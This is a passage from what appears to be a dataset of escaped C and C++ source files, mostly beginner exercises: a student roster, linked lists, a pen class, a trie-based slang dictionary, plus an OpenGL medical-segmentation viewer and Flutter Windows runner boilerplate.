{\r\n        Student* current_student = classRosterArray[i];\r\n        if (current_student->getId() == studentID) {\r\n            found = i;\r\n            break;\r\n        }\r\n    }\r\n    return found;\r\n}\r\n\r\nsize_t Roster::firstEmptySpot() {\r\n    size_t empty_index{};\r\n    int arrSize{maxStudents()}; // Max number of students\r\n    for (int i{0}; i < arrSize; i++)\r\n        if (i == (arrSize - 1)) {\r\n            empty_index = arrSize;\r\n        }\r\n        else if (classRosterArray[i] == NULL) {\r\n            empty_index = i;\r\n            break;\r\n        }\r\n    return empty_index;\r\n}\r\n\r\nvoid Roster::add(string studentID, string firstName, string lastName, string emailAddress, int age, int daysInCourse1, int daysInCourse2, int daysInCourse3, DegreeProgram degreeprogram) {\r\n    // Convert daysInCourse# to array\r\n    int daysInCourses[]{\r\n        daysInCourse1,\r\n        daysInCourse2,\r\n        daysInCourse3\r\n    };\r\n\r\n    // Find empty spot on roster array\r\n    size_t empty_index{firstEmptySpot()};\r\n\r\n    // Add to roster\r\n    *(classRosterArray + empty_index) = new Student{\r\n        studentID,\r\n        firstName,\r\n        lastName,\r\n        emailAddress,\r\n        age,\r\n        daysInCourses,\r\n        degreeprogram\r\n    };\r\n}\r\n\r\nvoid Roster::remove(string studentID) {\r\n    int arrSize{maxStudents()}; // Max number of students\r\n    \r\n    // Find index of student with id\r\n    int found{studentIndexById(studentID)};\r\n    if (found == -1) {\r\n        std::cout << std::endl << \"Could not find student ID \\\"\" << studentID << \"\\\" in roster.\" << std::endl;\r\n    }\r\n    // Delete student\r\n    else {\r\n        delete classRosterArray[found];\r\n\r\n        // Move remaining students down on array\r\n        for (int i{found}; i < (arrSize - 1); i++) {\r\n            classRosterArray[i] = classRosterArray[i + 1];\r\n        }\r\n        Student* new_last[1] {}; // Workaround to duplicate behavior of initial student pointer array\r\n        classRosterArray[arrSize - 1] = new_last[0];\r\n    }\r\n}\r\n\r\nvoid Roster::printAll() {\r\n    size_t empty_index{firstEmptySpot()};\r\n    for (size_t i{0}; i < empty_index; i++) {\r\n        Student* current_student = classRosterArray[i];\r\n        current_student->print();\r\n    }\r\n    std::cout << std::endl;\r\n}\r\n\r\nvoid Roster::printAverageDaysInCourse(string studentID) {\r\n    // Point to desired student\r\n    Student* current_student{classRosterArray[studentIndexById(studentID)]};\r\n\r\n    // Calculate average\r\n    int sumDays{current_student->getCompletionDay(1) + current_student->getCompletionDay(2) + cu",
    "#include <iostream>\n#include <string>\nusing namespace std;\n\nstruct Node\n{\n    int noMhs;\n    string name;\n    Node* next;\n    Node* prev;\n};\n\nNode* START = NULL;\n\nvoid addNode() {\n    Node* newNode = new Node(); // STEP 1: create a new node\n    cout << \"\\nEnter the roll number of student: \";\n    cin >> newNode->noMhs;      // assign value to the data field of the new node\n    cout << \"\\nEnter the name of the student: \";\n    cin >> newNode->name;       // Assign value to the data field of the new node\n\n    // Insert the new node in the list\n    if (START == NULL || newNode->noMhs <= START->noMhs) { // STEP 2: insert the new node\n        \n        if (START != NULL && newNode->noMhs == START->noMhs) {\n            cout << \"\\033[31mDuplicate roll not allowed\\033[0m\" << endl;\n            return;\n        }\n        // If the list is empty, make the new node the START\n        newNode->next = START;  //STEP 3: make the new node point to the first node\n        if (START != NULL) {    \n            START->prev = newNode;  //STEP 4: make the first node point to the new node\n        }\n        newNode->prev = NULL;       //STEP 5: make the new node point to NULL\n        START = newNode;            //STEP 6: make the new node the first node\n    }\n    else {\n        // insert the new node in the middle or at the end\n        Node* current = START; // STEP 1.a: start from the first\n        Node* previous = NULL; // STEP 1.b: previous node is NULL initially\n\n        while (current != NULL && current->noMhs < newNode->noMhs) { // STEP 1.c: traver\n            previous = current; // STEP 1.d: move the previous to the current Node\n            current = current->next; // STEP 1.e: move the current to the next node\n        }\n\n        newNode->next = current; // STEP 4: Make the next field of the new node point to current\n        newNode->prev = previous; // STEP 5: Make the previous field of the new node point to previous\n        \n        if (current != NULL) {\n            current->prev = newNode; // STEP 6: Make the previous field of the current\n        }\n\n        if (previous != NULL) {\n            previous->next = newNode; // STEP 7 : make the next field of the previous node\n        }\n        else {\n            //If previous is still NULL, it means newNode is now the first node\n            START = newNode;\n        }\n    }\n}\n\nbool search(int rollNo, Node** previous, Node** current)\n{\n    *previous = NULL;\n    *current = START;\n    while (*current != NULL && (*current)->noMhs != rollNo)\n    {\n        *previous = *current;\n        *current = (*current)->next;\n    }\n    return (*current != NULL);\n}\n\nvoid deleteNode()\n{\n    Node* previous, * current;\n    int rollNo;\n\n    cout << \"\\nEnter the roll number of the student whose record is to be deleted: \";\n    cin >> rollNo;                                                                  //STEP 3: get the roll number to be deleted\n\n    if (START == NULL)\n    {\n        cout << \"List is empety\" << endl;\n        return;\n    }\n\n    current = START;                                                               //STEP 1: start from the first node\n    previous = NULL;\n\n    //locate the node to be deleted\n    while (current != NULL && current->noMhs != rollNo)\n    {\n        previous = current;\n        current = current->next;\n    }\n\n    if (current == NULL)\n    {\n        cout << \"\\033[31mThe record with roll number \" << rollNo << \"not found\\033[0m\" << endl;\n        return;\n    }\n\n    //Node to be deleted is the firts node\n    if (current == START)\n    {\n        START = START->next;                                            //STEP 2: update the START pointer\n        if (START != NULL)\n        {\n            START->prev = NULL;                                         //step\n        }\n    }\n    else\n    {   //Node to be deleted is not the first node\n        previous->next = current->next;\n        if (current->next != NULL)\n        {   //if there's successor, update is prev pointer\n            current->next->prev = previous;\n        }\n    }\n\n    //release the memory of the node marked as current\n    delete current;\n    cout << \"\\x1b[32mRecord with roll number \" << rollNo << \"deleted\\x1b[0m\" << endl;\n}\n\nbool listEmpty()\n{\n    return (START == NULL);\n}\n\nvoid traverse()\n{\n    if (listEmpty())\n        cout << \"\\nList is empty\" << endl;\n    else\n    {\n        cout << \"\\nRecord is ascending order of roll number are:  \" << endl;\n        Node* currentNode = START;              //STEP 1\n        while (currentNode != NULL)             //STEP 2\n        {\n            cout << currentNode->noMhs << \" \" << currentNode->name << endl;         //STEP 3\n            currentNode = currentNode->next;                                        //STEP 4\n        }\n    }\n}\n\nvoid revtraverse()\n{\n    if (listEmpty())\n        cout << \"\\nList is empty\" << endl;\n    else\n    {\n        cout << \"\\nRecord is descending order of roll number are:  \" << endl;\n        Node* currentNode = START;\n        while (currentNode->next != NULL)\n      ",
    "#include <iostream>\n#include <cctype>\nusing namespace std;\n\nclass Pen\n{\npublic:\n    string model;\n    string color;\n    float tip;\n    int charge;\n    bool covered;\n\n    void scribble()\n    {\n        if (covered == true)\n        {\n            cout << \"[ERROR] A caneta esta tampada!\" << endl;\n        }\n        else\n        {\n            charge -= 1;\n            cout << \"A caneta rabiscou e agora a caneta tem \"<< charge <<\" % da carga!\" << endl;\n        }\n    }\n\n    void cover()\n    {\n        if (covered == true)\n        {\n            cout << \"[ERROR] A caneta ja esta tampada!\" << endl;\n        }\n        else\n        {\n            cout << \"A caneta foi tampada!\" << endl;\n            covered = true;\n        }\n    }\n\n    void uncover()\n    {\n        if (covered == true)\n        {\n            cout << \"A caneta foi destampada!\" << endl;\n            covered = false;\n        }\n        else\n        {\n            cout << \"[ERROR] A caneta nao esta tampada!\" << endl;\n        }\n    }\n};\n\nstring toLowerCase(const string &str)\n{\n    string lowerStr = str;\n    for (int i = 0; i < lowerStr.length(); ++i)\n    {\n        if (lowerStr[i] >= 'A' && lowerStr[i] <= 'Z')\n        {\n            lowerStr[i] += ('a' - 'A');\n        }\n    }\n    return lowerStr;\n}\n\nint main()\n{\n    Pen pen1;\n    cout << \"Qual e o modelo da caneta: \";\n    getline(cin, pen1.model);\n    cout << \"Qual e a cor da caneta: \";\n    getline(cin, pen1.color);\n    cout << \"Qual e o tamanho da ponta: \";\n    cin >> pen1.tip;\n    cout << \"Qual e a percentagem da carga: \";\n    cin >> pen1.charge;\n    if (pen1.charge < 0 || pen1.charge > 100)\n    {\n        cout << \"[ERROR] valor incorreto. Verifique sua resposta e tente de novo.\";\n        return 0;\n    }\n    \n    string response;\n    cout << \"A caneta esta tampada (Y/N): \";\n    cin >> response;\n\n    if (toLowerCase(response) == \"y\")\n    {\n        pen1.covered = true;\n        response = \"esta\";\n    }\n    else if (toLowerCase(response) == \"n\")\n    {\n        pen1.covered = false;\n        response = \"nao esta\";\n    }\n    else\n    {\n        cout << \"[ERROR] A resposta esta incorreta. Verifique sua resposta e tente de novo.\" << endl;\n        return 0;\n    }\n    \n    cout << \"A sua caneta e do modelo \" << pen1.model << \", a cor da sua caneta e \" << pen1.color << \", o tamanho da ponta e \" << pen1.tip << \", a carga da caneta esta a \" << pen1.charge << \"% e a caneta \" << response << \" tampada.\" << endl;\n\n    cout << \"Deseja fazer mais alguma coisa (Y/N): \";\n    cin >> response;\n\n    if (toLowerCase(response) == \"y\")\n    {\n        while (toLowerCase(response) == \"y\")\n        {\n            cout << \"O que deseja fazer(rabiscar, tampar ou destampar):\";\n            cin >> response;\n            if (toLowerCase(response) == \"rabiscar\")\n            {\n                pen1.scribble();\n            }\n            else if (toLowerCase(response) == \"tampar\")\n            {\n                pen1.cover();\n            }\n            else if (toLowerCase(response) == \"destampar\")\n            {\n                pen1.uncover();\n            }\n            else\n            {\n                cout << \"[ERROR] A resposta esta incorreta. Verifique sua resposta e tente de novo.\" << endl;\n                return 0;\n            }\n\n            cout << \"Deseja fazer mais alguma coisa (Y/N): \";\n            cin >> response;\n\n            if (toLowerCase(response) == \"y\")\n            {\n                \n            }\n            else if (toLowerCase(response) == \"n\")\n            {\n                return 0;\n            }\n            else\n            {\n                cout << \"[ERROR] A resposta esta incorreta. Tente de novo.\" << endl;\n                return 0;\n            }\n            \n        }\n    }\n    else if (toLowerCase(response) == \"n\")\n    {\n        return 0;\n    }\n    else\n    {\n        cout << \"[ERROR] A resposta esta incorreta. Tente de novo.\" << endl;\n        return 0;\n    }\n}\n",
    "#include <GL/glew.h>\n#include <GL/glut.h>\n#include <iostream>\n#include <glm/glm.hpp>\n#include <cmath>\n#include \"shaders.h\"\n#include <stdlib.h>\n#include \"model.h\"\n#include <vector>\n#include <map>\n#include <imgui.h>\n#include <backends/imgui_impl_glut.h>\n#include <backends/imgui_impl_opengl3.h>\n#include <commdlg.h>\n\nconst double M_PI = 3.14159265359;\n\nbool start_screen = true;\n\nextern std::vector<float> vertices;\nextern std::map<int, std::map<int, std::map<int, std::map<char, unsigned int>>>> vertex_map;\nextern std::vector<unsigned int> indices;\nextern std::vector<float> colors;\nextern std::vector<float> normals;\n\nint mouseoldx, mouseoldy;\nglm::vec3 eye;\nglm::vec3 up;\nconst glm::vec3 eyeinit = glm::vec3(0, 500, 0);\nconst glm::vec3 upinit = glm::vec3(0, 0, 1);\nconst glm::vec3 center = glm::vec3(0, 0, 0);\nconst glm::vec2 screen_up = glm::vec2(-1, 0);\nGLuint vertexshader, fragmentshader, shaderprogram;\nGLuint projectionPos, modelviewPos, lightdirPos;\nglm::mat4 projection, modelview;\nglm::vec3 lightdir;\n\nconst int numobjects = 1;\nconst int numperobj = 4;\nGLuint VAOs[numobjects];\nGLuint buffers[numperobj * numobjects];\nGLenum PrimType[numobjects];\nGLsizei NumElems[numobjects];\n\nenum {Vertices, Colors, Normals, Elements};\n\nvoid deleteBuffers() {\n    glDeleteVertexArrays(numobjects, VAOs);\n    glDeleteBuffers(numperobj * numobjects, buffers);\n}\n\nglm::mat3 dual_matrix(glm::vec3 a) {\n    return glm::mat3(0, a[2], -a[1], -a[2], 0, a[0], a[1], -a[0], 0);\n}\n\nglm::vec3 cross(glm::vec3 a, glm::vec3 b) {\n    return dual_matrix(a) * b;\n}\n\nglm::vec3 normalize(glm::vec3 a) {\n    float magnitude = sqrt(a[0] * a[0] + a[1] * a[1] + a[2] * a[2]);\n    return glm::vec3(a[0] / magnitude, a[1] / magnitude, a[2] / magnitude);\n}\n\nglm::mat4 lookAt(glm::vec3 eye, glm::vec3 center, glm::vec3 up) {\n    glm::vec3 x, y, z;\n    glm::mat4 translation_matrix, rotation_matrix;\n    z = eye - center;\n    x = cross(up, z);\n    y = cross(z, x);\n    x = normalize(x);\n    y = normalize(y);\n    z = normalize(z);\n    rotation_matrix = glm::mat4(x[0], y[0], z[0], 0, x[1], y[1], z[1], 0, x[2], y[2], z[2], 0, 0, 0, 0, 1);\n    translation_matrix = glm::mat4(1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, -eye[0], -eye[1], -eye[2], 1);\n    return rotation_matrix * translation_matrix;\n}\n\nvoid initobject(GLuint object, GLfloat *vert, GLint sizevert, GLfloat *col, GLint sizecol, GLfloat *nor, GLint sizenor, GLuint *inds, GLint sizeind, GLenum type) {\n    int offset = object * numperobj;\n    glBindVertexArray(VAOs[object]);\n    \n    glBindBuffer(GL_ARRAY_BUFFER, buffers[Vertices + offset]);\n    glBufferData(GL_ARRAY_BUFFER, sizevert, vert, GL_STATIC_DRAW);\n    glEnableVertexAttribArray(0);\n    glVertexAttribPointer(0, 3, GL_FLOAT, GL_FALSE, 3 * sizeof(GLfloat), 0);\n\n    glBindBuffer(GL_ARRAY_BUFFER, buffers[Colors + offset]);\n    glBufferData(GL_ARRAY_BUFFER, sizecol, col, GL_STATIC_DRAW);\n    glEnableVertexAttribArray(1);\n    glVertexAttribPointer(1, 3, GL_FLOAT, GL_FALSE, 3 * sizeof(GLfloat), 0);\n\n    glBindBuffer(GL_ARRAY_BUFFER, buffers[Normals + offset]);\n    glBufferData(GL_ARRAY_BUFFER, sizenor, nor, GL_STATIC_DRAW);\n    glEnableVertexAttribArray(2);\n    glVertexAttribPointer(2, 3, GL_FLOAT, GL_FALSE, 3 * sizeof(GLfloat), 0);\n\n    glBindBuffer(GL_ELEMENT_ARRAY_BUFFER, buffers[Elements + offset]);\n    glBufferData(GL_ELEMENT_ARRAY_BUFFER, sizeind, inds, GL_STATIC_DRAW);\n    \n    PrimType[object] = type;\n    NumElems[object] = sizeind / 4;\n\n    glBindVertexArray(0);\n}\n\nvoid drawobject(GLuint object) {\n    glBindVertexArray(VAOs[object]);\n    glDrawElements(PrimType[object], NumElems[object], GL_UNSIGNED_INT, 0);\n    glBindVertexArray(0);\n}\n\nfloat dot_3d(glm::vec3 vec1, glm::vec3 vec2) {\n    return vec1[0] * vec2[0] + vec1[1] * vec2[1] + vec1[2] * vec2[2];\n}\n\nvoid display() {\n\n    // Start the Dear ImGui frame\n    ImGui_ImplOpenGL3_NewFrame();\n    ImGui_ImplGLUT_NewFrame();\n    ImGui::NewFrame();\n    ImGuiIO& io = ImGui::GetIO();\n\n    // Start screen\n    if (start_screen) {\n        ImGui::Begin(\"Open a segmentation (.nii) file\");\n        if (ImGui::Button(\"Open...\")) {\n\n            OPENFILENAMEA ofn;\n            CHAR szFile[260] = { 0 };\n            ZeroMemory(&ofn, sizeof(OPENFILENAME));\n            ofn.lStructSize = sizeof(OPENFILENAME);\n            ofn.hwndOwner = FindWindowA(nullptr, \"Demo\");\n            ofn.lpstrFile = szFile;\n            ofn.nMaxFile = sizeof(szFile);\n            ofn.lpstrFilter = \"NIFTI (*.nii)\\0*.nii\\0\";\n            ofn.nFilterIndex = 1;\n            ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST | OFN_NOCHANGEDIR;\n            if (GetOpenFileNameA(&ofn) == TRUE) {\n                int ret = load_model(ofn.lpstrFile);\n\n                if (ret == 1)\n                {\n                    std::cout << \"Success loading vessel\" << std::endl;\n                }\n\n                initobject(0, (GLfloat*)&vertices[0], vertices.size() * 4, (GLfloat*)&colors[0], colors.size() * 4, (GLfloat*)&normals[0], normals.size() * 4, (GLuint*)&indices[0], indices.size()",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"ngdemo_21\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_projet1\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include<iostream>\r\nusing namespace std;\r\nclass node\r\n{\r\n    public:\r\n    int val;\r\n    node* next;\r\n    node(int val)\r\n    {\r\n        this->val=val;\r\n        this->next= NULL;\r\n    }\r\n};\r\nclass LinkedList{\r\n    public:\r\n    node* head;\r\n    node* tail;\r\n    int size;\r\n    LinkedList()\r\n    {\r\n        head=tail=NULL;\r\n        size=0;\r\n\r\n    }\r\n    void insertatend(int val)\r\n    {\r\n        node* temp=new node(val);\r\n        if(size==0) head=tail=temp;\r\n        else{\r\n            tail->next=temp;\r\n            tail=temp;\r\n            \r\n        }\r\n        size++;\r\n    }\r\n    void insertathead(int val)\r\n    {\r\n        node* temp=new node(val);\r\n        if(size==0) head=tail=temp;\r\n        else{\r\n           temp->next=head;\r\n           head=temp;\r\n        }\r\n        size++;\r\n    }\r\n    void insertatindex(int idx,int val)\r\n    {\r\n        if(idx==0) insertathead(val);\r\n        else if(idx==size)insertatend(val);\r\n        else if(idx<0 || idx>=size) cout<<\"invalid linked list\"<<\" \";\r\n        else\r\n        {\r\n            node* temp=new node(val);\r\n            node* t=head;\r\n            for(int i=1;i<=idx-1;i++)\r\n            {\r\n                t=t->next;\r\n\r\n            }\r\n            temp->next=t->next;\r\n            t->next=temp;\r\n        }\r\n    }\r\n    \r\n\r\n    void display()\r\n    {\r\n        node* temp=head;\r\n        while(temp!=NULL)\r\n        {\r\n            cout<<temp->val<<\" \";\r\n            temp=temp->next;\r\n        }\r\n        cout<<endl;\r\n    }\r\n    int getelement(int idx)\r\n    {\r\n        if(idx==0) return head->val;\r\n        else if(idx==size-1)return tail->val;\r\n        else if(idx<0 || idx>=size) \r\n        {\r\n          cout<<\"invalid\";\r\n          return -1;\r\n        }\r\n         else\r\n        {\r\n            \r\n            node* temp=head;\r\n            for(int i=1;i<=idx;i++)\r\n            {\r\n                temp=temp->next;\r\n\r\n            }\r\n            return temp->val;\r\n            \r\n        }\r\n    }\r\n    void deleteathead()\r\n    {\r\n        if(size==0)cout<<\"list is empty\";\r\n        if(size>=1)\r\n        {\r\n            head=head->next;\r\n            size--;\r\n        }\r\n    }\r\n    void deleteatend()\r\n    {\r\n        node* temp=head;\r\n        while(temp->next!=tail)temp=temp->next;\r\n        temp->next=NULL;\r\n        tail=temp;\r\n    }\r\n    void deleteatindex(int idx)\r\n    {\r\n        if(idx==0) deleteathead();\r\n        else if(idx==size-1) deleteatend();\r\n        else if(idx<0 || idx>=size) cout<<\"invalid index\"<<\" \";\r\n        else\r\n        {\r\n            node* temp=head;\r\n            for(int i=1;i<=idx-1;i++)\r\n            {\r\n                temp=temp->next;\r\n\r\n            }\r\n            temp->next=temp->next->next;\r\n            \r\n        }\r\n    }\r\n    \r\n\r\n\r\n    \r\n    \r\n    \r\n\r\n};\r\n\r\n\r\nint main()\r\n{\r\n   LinkedList ll;\r\n   ll.insertatend(10);\r\n   ll.insertatend(20);\r\n   ll.display();\r\n   ll.insertathead(30);\r\n   ll.display();\r\n   ll.insertatend(40);\r\n   ll.insertatend(50);\r\n   ll.display();\r\n   ll.insertatindex(2,15);\r\n   ll.display();\r\n   cout<<ll.getelement(2)<<endl;\r\n   ll.deleteathead();\r\n   ll.display();\r\n   ll.deleteatend();\r\n   ll.display();\r\n   ll.deleteatindex(2);\r\n   ll.display();\r\n   \r\n\r\n\r\n\r\n   \r\n   \r\n\r\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <stdbool.h>\n\n#define CHAR_SIZE 256\nint count = 1;\nchar word[101];\n\nstruct trieNode{\n\tstruct trieNode *children[CHAR_SIZE];\n\tbool isEndOfWorld;\n\tchar desc[100];\n};\n\nstruct trieNode *createNode(){\n\tstruct trieNode *node = (struct trieNode*)malloc(sizeof(struct trieNode));\n\t\n\tif(node){\n\t\tnode->isEndOfWorld = false;\n\t\t\n\t\tfor(int i = 0; i < CHAR_SIZE; i++){\n\t\t\tnode->children[i] = NULL;\n\t\t}\n\t}\n\t\n\treturn node;\n}\n\nvoid insert(struct trieNode *root, char *key){\n\tstruct trieNode *current = root;\n\t\n\tint length = strlen(key);\n\t\n\tfor(int i = 0; i < length; i++){\n\t\tint index = key[i] - 'A';\n\t\t\n\t\tif(!current->children[index]){\n\t\t\tcurrent->children[index] = createNode();\n\t\t}\n\t\t\n\t\tcurrent = current->children[index];\n\t}\n\t\n\tcurrent->isEndOfWorld = true;\n}\n\nbool search(struct trieNode *root, char *key){\n\tstruct trieNode *current = root;\n\tint length = strlen(key);\n\t\n\tfor(int i = 0; i < length; i++){\n\t\tint index = key[i] - 'A';\n\t\t\n\t\tif(!current->children[index]){\n\t\t\treturn false;\n\t\t}\n\t\t\n\t\tcurrent = current->children[index];\n\t}\n\t\n\treturn (current != NULL && current->isEndOfWorld);\n}\n\nvoid printTrie(struct trieNode *root, char *buffer, int depth){\n\tbool hasWords = false;\n\t\n\tif(root->isEndOfWorld){\n\t\thasWords = true;\n\t\t\n\t\tif(count == 1){\n\t\t\tprintf(\"List of all slang words in the dictionary:\\n\");\n\t\t}\n\t\t\n\t\tbuffer[depth] = '\\0';\n\t\tprintf(\"%d. %s\\n\",count, buffer);\n\t\tcount++;\n\t}\n\t\n\tfor(int i = 0; i < CHAR_SIZE; i++){\n\t\tif(root->children[i] != NULL){\n\t\t\tbuffer[depth] = i + 'A';\n\t\t\tprintTrie(root->children[i], buffer, depth + 1);\n\t\t\thasWords = true;\n\t\t}\n\t}\n\t\n\tif(!hasWords){\n\t\tprintf(\"There is no slang words yet in the dictionary.\\n\");\n\t}\n}\n\nvoid printTrieWithPrefix(struct trieNode *root, char *prefix, char *buffer, int depth){\n\tbool hasWords = false;\n\t\n\tif(root->isEndOfWorld){\n\t\thasWords = true;\n\t\t\n\t\tif(count == 1){\n\t\t\tprintf(\"List of all slang words in the dictionary:\\n\");\n\t\t}\n\t\t\n\t\tbuffer[depth] = '\\0';\n\t\tprintf(\"%d. %s%s\\n\",count, prefix, buffer);\n\t\tcount++;\n\t}\n\t\n\tfor(int i = 0; i < CHAR_SIZE; i++){\n\t\tif(root->children[i] != NULL){\n\t\t\tbuffer[depth] = i + 'A';\n\t\t\tprintTrieWithPrefix(root->children[i], prefix, buffer, depth + 1);\n\t\t\thasWords = true;\n\t\t}\n\t}\n\t\n\tif(!hasWords){\n\t\tprintf(\"There is no prefix \\\"%s\\\" in the dictionary.\\n\", prefix);\n\t}\n}\n\nvoid searchPrefix(struct trieNode *root, char *prefix){\n\tstruct trieNode *current = root;\n\tint length = strlen(prefix);\n\tchar buffer[100];\n\t\n\tfor(int i = 0; i < length; i++){\n\t\tint index = prefix[i] - 'A';\n\t\t\n\t\tif(current->children[index] == NULL){\n\t\t\tprintf(\"There is no prefix \\\"%s\\\" in the dictionary.\\n\", prefix);\n\t\t\treturn;\n\t\t}\n\t\tcurrent = current->children[index];\n\t}\n\t\n\tprintf(\"Words starting with \\\"%s\\\": \\n\", prefix);\n\tprintTrieWithPrefix(current, prefix, buffer, 0);\n}\n\nvoid menu(){\n\tsystem(\"cls\");\n\tputs(\"1. Release a new slang word\");\n\tputs(\"2. Search a slang word\");\n\tputs(\"3. View all slang words starting with a certain prefix word\");\n\tputs(\"4. View all slang words\");\n\tputs(\"5. Exit\");\n\tprintf(\">> \");\n}\n\nint main(){\n\tstruct trieNode *root = createNode();\n\t\n\tint choice;\n\tchar desc[100], searchWord[100], searchPrefix1[100];\n\t\n\twhile(true){\n\t\tmenu();\n\t\tscanf(\"%d\", &choice);\n\t\t\n\t\tswitch(choice){\n\t\t\tcase 1:{\n\t\t\t\tdo{\n\t\t\t\t\tprintf(\"Input a new slang word [Must be more than 1 characters and contains no space]: \");\n\t\t\t\t\tscanf(\"%s\", word); getchar();\n\t\t\t\t\t\n\t\t\t\t\tif(search(root, word)){\n\t\t\t\t\t\tprintf(\"Input a new slang word description [Must be more than 2 words]: \");\n\t\t\t\t\t\tscanf(\"%s\", desc); getchar();\n\t\t\t\t\t\tinsert(root, desc);\n\t\t\t\t\t}\t\n\t\t\t\t\t\n\t\t\t\t} while(strlen(word) <= 1 && strchr(word, ' ') == 0);\n\t\t\t\t\n\t\t\t\tinsert(root, word);\n\t\t\t\t\n\t\t\t\tprintf(\"Succesfully released new slang word.\\n\");\n\t\t\t\tsystem(\"pause\");\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\t\n\t\t\tcase 2:{\n\t\t\t\tprintf(\"Input a slang word to be searched [Must be more than 1 characters and contains no space]: \");\n\t\t\t\tscanf(\"%s\", searchWord); getchar();\n\t\t\t\t\n\t\t\t\tif(!search(root, searchWord)){\n\t\t\t\t\tprintf(\"There is no word '%s' in the dictionary.\\n\", searchWord);\n\t\t\t\t} else {\n\t\t\t\t\tprintf(\"Slang word: %s\\n\", searchWord);\n\t\t\t\t\tprintf(\"Description: %s\\n\", desc);\n\t\t\t\t}\n\t\t\t\tsystem(\"pause\");\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\t\n\t\t\tcase 3:{\n\t\t\t\tprintf(\"Input a prefix to be searched: \");\n\t\t\t\tscanf(\"%s\", searchPrefix1); getchar();\n\t\t\t\t\n\t\t\t\tsearchPrefix(root, searchPrefix1);\n\t\t\t\tsystem(\"pause\");\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\t\n\t\t\tcase 4:{\n\t\t\t\tcount = 1;\n\t\t\t\tchar buffer[100];\n\t\t\t\tprintTrie(root, word, 0);\n\t\t\t\tsystem(\"pause\");\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\t\n\t\t\tcase 5:{\n\t\t\t\tprintf(\"Thank you... Have a nice day :)\\n\");\n\t\t\t\treturn 